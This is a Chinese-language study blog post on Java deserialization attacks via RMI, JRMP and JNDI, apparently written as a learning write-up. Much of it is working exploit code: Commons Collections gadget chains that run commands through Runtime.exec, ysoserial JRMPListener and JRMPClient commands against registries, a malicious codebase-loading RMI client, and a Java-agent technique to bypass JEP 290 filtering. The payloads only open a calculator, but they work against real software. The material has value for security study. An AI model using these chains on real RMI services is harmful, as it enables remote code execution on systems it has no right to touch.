# Java反序列化学习之RMI/JRMP/JNDI

## 前言
花时间好好学习RMI/JRMP/JNDI的区别，这三个是近两年Java反序列化经常出现的概念，涉及到的知识点也比较多，需要花时间琢磨一番。由于知识点太多，对于自己学习总结的话，主要是记录关键内容。

## 基本概念

**RMI**

RMI是java中的远程方法调用，指的是操作行为。通常是指调用jvm之外的API方法

**JRMP**

JRMP是Java远程方法协议，在RMI的过程中，通过JRMP协议进行数据传输调用。该协议用于Java RMI过程中

**JNDI**

JNDI是java中的接口方法，通过接口实现目录系统。同时根据名称可实现对相关对象方法的查询，并下载查询到的对象方法。

## 反序列化攻击应用

### Java RMI反序列化

在执行Java RMI时，传输的数据包含有序列化数据。并且无论是在JRMP的客户端还是服务端接收到JRMP协议数据时，都会将序列化的数据进行反序列化。所以在这个过程中，针对开启了RMI服务的主机，可对其发送序列化代码造成反序列化攻击。

Server注册对象：

1. Server向Registry注册远程对象，远程对象绑定在一个//host:port/objectname上，形成映射表（Service-Stub）

Client调用：

1. Client向Registry通过RMI地址查询对应的远程引用（Stub）。这个远程引用包含了一个服务器主机名和端口号
1. Client拿着Registry给它的远程引用，照着上面的服务器主机名、端口去连接提供服务的远程RMI服务器
1. Client传送给Server需要调用函数的输入参数，Server执行远程方法，并返回给Client执行结果


![2.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/2.png)


**反序列化攻击**

攻击场景分为三种：

1. 服务端攻击注册中心
1. 注册中心攻击客户端
1. 客户端攻击注册中心

作为渗透攻击来说，见得比较多的还是第三种情况。网络中发现RMI注册中心，对注册中心发起反序列化攻击。对于其他两种攻击场景，借用别人的复现简单描述一下。

1）服务端攻击注册中心

服务端也是向注册中心序列化传输远程对象,使用ysoserial工具中的RMIRegistryExploit代码，构造反序列化Gadget发送给注册中心。可使用ysoserial payload模块中的Gadget

	public class HelloServer {
	    public static void main(String[] args) throws Exception {
	        try {
	​
	            Transformer[] transformers = new Transformer[]{
	                    new ConstantTransformer(Runtime.class),
	                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
	                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
	                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/Calculator.app"}),
	            };
	            Transformer transformer = new ChainedTransformer(transformers);
	            Map innerMap = new HashMap();
	            Map ouputMap = LazyMap.decorate(innerMap, transformer);
	​
	            TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap, "pwn");
	            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
	​
	            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
	            field.setAccessible(true);
	            field.set(badAttributeValueExpException, tiedMapEntry);
	​
	            Map tmpMap = new HashMap();
	            tmpMap.put("pwn", badAttributeValueExpException);
	            Constructor<?> ctor = null;
	            ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
	            ctor.setAccessible(true);
	            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, tmpMap);
	            Remote remote = Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler));
	            Registry registry = LocateRegistry.getRegistry(1099);
	            registry.bind("hello1", remote);
	        } catch (Exception e) {
	            e.printStackTrace();
	        }
	    }
	}



2）注册中心攻击客户端

通过ysoserial启动JRMP服务端，指定payload和命令

    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "calc.exe"

然后启动RMI客户端的代码进行查询,会发现计算器直接被弹出

![1.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/1.png)

3）客户端攻击注册中心


通过ysoserial启动JRMPClient攻击注册中心，并指定攻击payload和执行的命令

>     java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 192.168.xxx.xxx 1099 CommonsCollections5 "calc.exe"

执行完命令后计算器直接弹出来了,原因是RMI框架采用DGC(Distributed Garbage Collection)分布式垃圾收集机制来管理远程对象的生命周期,可以通过与DGC通信的方式发送恶意payload让注册中心反序列化。


**JEP 290**

为了化解不安全的反序列化所带来的风险，Oracle对Java内核进行了相应的修改。其中最重要的一些修改是在JavaEnhancement Process（JEP）文档290（简称JEP 290）中所介绍的。JEP是JDK9的一部分，但已被反向移植到了较旧的Java版本中，其中包括：

-   Java™ SE Development Kit 8, Update 121 (JDK 8u121)
-   Java™ SE Development Kit 7, Update 131 (JDK 7u131)
-   Java™ SE Development Kit 6, Update 141 (JDK 6u141)

JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器,在RMI客户端和服务端在通信时参数传递这块是没有做处理的,而参数传递也是基于序列化数据传输,那么如果参数是泛型的payload,传输依然会有问题。

先把接口都新增一个sayPayload的方法,参数都是Object类型的

正常来说，查询的RMI服务端接口方法中包含object类。那就可以通过发送序列化对象数据，造成反序列化。定义如下的HelloInterface接口


    import java.rmi.Remote;
    ​
    public interface HelloInterface extends java.rmi.Remote {
    public String sayHello(String from) throws java.rmi.RemoteException;
    public Object sayPayload(Object from) throws java.rmi.RemoteException;
    }

RMI服务端编写HelloImpl实现sayPayload方法

	import java.rmi.server.UnicastRemoteObject;
	​
	public class HelloImpl extends UnicastRemoteObject implements HelloInterface {
	    public HelloImpl() throws java.rmi.RemoteException {
	        super();
	    }
	​
	    public String sayHello(String from) throws java.rmi.RemoteException {
	        System.out.println("Hello from " + from + "!!");
	        return "sayHello";
	    }
	​
	    public Object sayPayload(Object from) throws java.rmi.RemoteException {
	        System.out.println("Hello from " + from + "!!");
	        return null;
	    }
	}

客户端在调用这个sayPayload方法时直接传payload看下

	public class HelloClient {
	    public static void main(String[] args) {
	        try {
	            Registry registry = LocateRegistry.getRegistry(1099);
	            HelloInterface hello = (HelloInterface) registry.lookup("hello1");
	​
	            Transformer[] transformers = new Transformer[]{
	                    new ConstantTransformer(Runtime.class),
	                    new InvokerTransformer("getMethod",
	                            new Class[]{String.class, Class[].class},
	                            new Object[]{"getRuntime", new Class[0]}),
	                    new InvokerTransformer("invoke",
	                            new Class[]{Object.class, Object[].class},
	                            new Object[]{null, new Object[0]}),
	                    new InvokerTransformer("exec",
	                            new Class[]{String.class},
	                            new Object[]{"calc.exe"})
	            };
	            Transformer transformerChain = new ChainedTransformer(transformers);
	            Map innerMap = new HashMap();
	            Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
	            TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
	            BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
	            Field valfield = poc.getClass().getDeclaredField("val");
	            valfield.setAccessible(true);
	            valfield.set(poc, entry);
	            
	            hello.sayPayload(poc);
	        } catch (Exception e) {
	            e.printStackTrace();
	        }
	    }
	}


执行后服务端计算器直接弹出,如果把这个payload作为sayPayload方法的返回值 客户端计算器也会弹出。

![3.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/3.png)

看下反序列化的地方

sun.rmi.server.UnicastRef#marshalValue


在实际使用场景很少有参数是Object类型的,而攻击者可以完全操作客户端,因此可以用恶意对象替换从Object类派生的参数(例如String),具体有如下四种bypass的思路

- 将java.rmi包的代码复制到新包，并在新包中修改相应的代码
- 将调试器附加到正在运行的客户端，并在序列化之前替换这些对象
- 使用诸如Javassist这样的工具修改字节码
- 通过实现代理替换网络流上已经序列化的对象

目前主要绕过的方法是使用第三种，通过Java Agent的技术来实现对字节码的修改。对RMI 服务接口进行查询时，将原本不是object类型的参数替换为object类型，发送至invokeRemoteMethod的第三个参数

![5.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/5.png)

这里面直接使用 `https://github.com/Afant1/RemoteObjectInvocationHandler` 中代码。通过修改字节码，将invokeRemoteMethod处的参数进行修改替换为项目中编写的URLDNS类 ——> getObject ——> url

![6.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/6.png)


启动RMI server

![7.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/7.png)

通过mvn package打包，运行RmiClient前，VM options参数填写:-javaagent:C:\xx\xx\xx\xx\xx\rasp-1.0-SNAPSHOT.jar

![8.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/8.png)

在invokeRemoteMethod位置下断点，debug后查看参数情况如下，传入的参数已被修改为URLDNS gadget

![4.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/4.png)


### RMI动态类加载

RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class。

对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，客户端就需要从服务端提供的java.rmi.server.codebaseURL去加载类；

对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的子类，那么服务端需要从客户端提供的java.rmi.server.codebaseURL去加载对应的类。

客户端与服务端两边的java.rmi.server.codebaseURL都是互相传递的。无论是客户端还是服务端要远程加载类，都需要满足以下条件：

1. 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。
1. 属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。


**攻击示例**

RMI Server

	//RMIServer.java
	package com.longofo.javarmi;
	
	import java.rmi.AlreadyBoundException;
	import java.rmi.RMISecurityManager;
	import java.rmi.RemoteException;
	import java.rmi.registry.LocateRegistry;
	import java.rmi.registry.Registry;
	import java.rmi.server.UnicastRemoteObject;
	
	public class RMIServer2 {
	    /**
	     * Java RMI 服务端
	     *
	     * @param args
	     */
	    public static void main(String[] args) {
	        try {
	            // 实例化服务端远程对象
	            ServicesImpl obj = new ServicesImpl();
	            // 没有继承UnicastRemoteObject时需要使用静态方法exportObject处理
	            Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);
	            Registry reg;
	            try {
	                //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
	                System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
	                RMISecurityManager securityManager = new RMISecurityManager();
	                System.setSecurityManager(securityManager);
	
	                // 创建Registry
	                reg = LocateRegistry.createRegistry(9999);
	                System.out.println("java RMI registry created. port on 9999...");
	            } catch (Exception e) {
	                System.out.println("Using existing registry");
	                reg = LocateRegistry.getRegistry();
	            }
	            //绑定远程对象到Registry
	            reg.bind("Services", services);
	        } catch (RemoteException e) {
	            e.printStackTrace();
	        } catch (AlreadyBoundException e) {
	            e.printStackTrace();
	        }
	    }
	}


接口对象

	package com.longofo.javarmi;
	
	import java.rmi.RemoteException;
	
	public interface Services extends java.rmi.Remote {
	    Object sendMessage(Message msg) throws RemoteException;
	}



恶意RMI客户端


	package com.longofo.javarmi;
	
	import com.longofo.remoteclass.ExportObject1;
	
	import java.rmi.registry.LocateRegistry;
	import java.rmi.registry.Registry;
	
	public class RMIClient2 {
	    public static void main(String[] args) throws Exception {
	        System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");
	        Registry registry = LocateRegistry.getRegistry();
	        // 获取远程对象的引用
	        Services services = (Services) registry.lookup("rmi://127.0.0.1:9999/Services");
	        ExportObject1 exportObject1 = new ExportObject1();
	        exportObject1.setMessage("hahaha");
	
	        services.sendMessage(exportObject1);
	    }
	}


这样就模拟出了另一种攻击场景，这时受害者是作为RMI服务端，需要满足以下条件才能利用：

- RMI服务端允许远程加载类
- 还有JDK限制(JDK 6u45、7u21)



### Java RMI扩展思考

JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器,在RMI客户端和服务端在通信时参数传递这块是没有做处理的,而参数传递也是基于序列化数据传输。

但是在实际情况中，遇到了RMI server。当然注册中心往往是和server绑定在一起的。可以直接对注册中心进行反序列化攻击，但是如果jdk版本过高，这时候要考虑绕过JEP290的问题。然而这个时候却需要知道当前RMI server绑定的哪些接口，这里需要使用工具**BaRMIe**（https://github.com/NickstaDB/BaRMIe）

![9.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/9.png)

如果知道接口为Object，即可直接利用

	public class AttackClient {
	public static void main(String[] args) {
	try {
	            String serverIP = "127.0.0.1"; //args[0];
				int serverPort = 1234;
	// Lookup the remote object that is registered as "bsides"
	            Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);
	            IBSidesService bsides = (IBSidesService) registry.lookup("bsides");
	// create the malicious object via ysososerial,
	// the OS command is taken from the command line
	            Object payload = new CommonsCollections6().getObject("calc");
	// pass it to the target by calling the "poke" method
	            bsides.poke(payload);
	        } catch (Exception e) {
	            e.printStackTrace();
	        }
	    }
	}

通过获取到绑定了Hello这个接口对象，接着构造执行链修改字节码。


### Java JNDI反序列化

JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。

